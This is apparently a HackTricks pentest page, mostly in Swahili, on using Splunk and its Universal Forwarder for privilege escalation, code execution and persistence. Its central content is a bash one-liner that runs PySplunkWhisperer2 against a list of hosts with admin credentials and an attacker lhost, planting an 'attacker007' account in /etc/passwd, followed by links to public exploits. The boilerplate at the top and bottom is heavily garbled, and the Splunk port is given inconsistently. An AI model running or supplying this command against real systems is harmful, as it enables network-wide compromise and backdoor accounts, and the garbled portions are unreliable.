# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Ikiwa **unapofanya hesabu** ya mashine **ndani** au **nje** unakuta **Splunk inafanya kazi** (bandari 8090), ikiwa kwa bahati unajua **akili halali** unaweza **kutumia huduma ya Splunk** ili **kufanya shell** kama mtumiaji anayekimbia Splunk. Ikiwa root inafanya kazi, unaweza kuongeza mamlaka hadi root.

Pia ikiwa wewe ni **root tayari na huduma ya Splunk haisikii tu kwenye localhost**, unaweza **kuiba** faili ya **nenosiri** **kutoka** kwa huduma ya Splunk na **kufungua** nenosiri, au **kuongeza** akili mpya kwake. Na kudumisha uvumilivu kwenye mwenyeji.

Katika picha ya kwanza hapa chini unaweza kuona jinsi ukurasa wa wavuti wa Splunkd unavyoonekana.



## Muhtasari wa Ulaghai wa Wakala wa Splunk Universal Forwarder

Kwa maelezo zaidi angalia chapisho [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hii ni muhtasari tu:

**Muonekano wa Ulaghai:**
Ulaghai unaolenga Wakala wa Splunk Universal Forwarder (UF) unaruhusu washambuliaji wenye nenosiri la wakala kutekeleza msimbo wowote kwenye mifumo inayokimbia wakala, ambayo inaweza kuhatarisha mtandao mzima.

**Mambo Muhimu:**
- Wakala wa UF hauhakiki muunganisho unaokuja au uhalali wa msimbo, hivyo unafanya kuwa hatari kwa utekelezaji wa msimbo usioidhinishwa.
- Njia za kawaida za kupata nenosiri ni pamoja na kuzitafuta katika saraka za mtandao, kushiriki faili, au nyaraka za ndani.
- Ulaghai uliofanikiwa unaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye mwenyeji walioathirika, uhamasishaji wa data, na kuingia zaidi kwenye mtandao.

**Utekelezaji wa Ulaghai:**
1. Mshambuliaji anapata nenosiri la wakala wa UF.
2. Anatumia API ya Splunk kutuma amri au skripti kwa wakala.
3. Vitendo vinavyowezekana ni pamoja na uchimbaji wa faili, usimamizi wa akaunti za mtumiaji, na kuathiri mfumo.

**Athari:**
- Kuathiri mtandao mzima kwa ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
- Uwezekano wa kuzima uandishi wa kumbukumbu ili kuepuka kugunduliwa.
- Usanidi wa milango ya nyuma au ransomware.

**Amri ya Mfano kwa Ulaghai:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Matumizi ya umma ya exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Kutumia Maswali ya Splunk

**Kwa maelezo zaidi angalia chapisho [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
